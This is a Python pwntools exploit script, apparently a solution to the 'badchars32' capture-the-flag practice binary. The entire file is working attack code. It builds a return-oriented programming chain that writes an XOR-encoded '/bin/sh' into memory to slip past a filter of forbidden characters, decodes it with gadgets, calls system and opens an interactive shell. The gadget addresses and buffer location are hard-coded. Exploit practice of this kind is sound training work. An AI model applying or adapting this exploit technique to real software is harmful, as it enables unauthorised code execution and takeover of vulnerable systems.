#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./badchars32')
else:
	p = remote()

badchars = ['b', 'i', 'c', '/', ' ', 'f', 'n', 's']

useful_func = 0x080487A9
call_sys = 0x080484E0

xor_pebx_cl_ret = 0x08048890
pop_ebx_ecx_ret = 0x08048896
mov_pedi_esi_ret = 0x08048893
pop_esi_edi_ret = 0x08048899

buf = 0x804a080
command = '/bin/sh\x00'
if len(command) % 4 != 0:
	pad_len = 4 - len(command) % 4
	command += '\x00' * pad_len
print command
xor_command = ''
for c in command:
	xor_command += chr(ord(c) ^ 2)
print xor_command
for c in xor_command:
	if c in badchars:
		raise ValueError, 'Bad char founded.'

gdb.attach(p)

payload = cyclic(0x200)
payload = 'A' * 44
for i in range(len(command) / 4):
	payload += p32(pop_esi_edi_ret) + \
               xor_command[4 * i:4 * i + 4] + \
               p32(buf + 4 * i) + \
               p32(mov_pedi_esi_ret)

for i in range(len(xor_command)):
	payload += p32(pop_ebx_ecx_ret) + \
               p32(buf + i) + \
               p32(2) + \
               p32(xor_pebx_cl_ret)

payload += p32(call_sys) + p32(0xdeadbeef) + p32(buf)

# check payload
for c in payload:
	if c in badchars:
		raise ValueError, 'Bad char founded.'

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
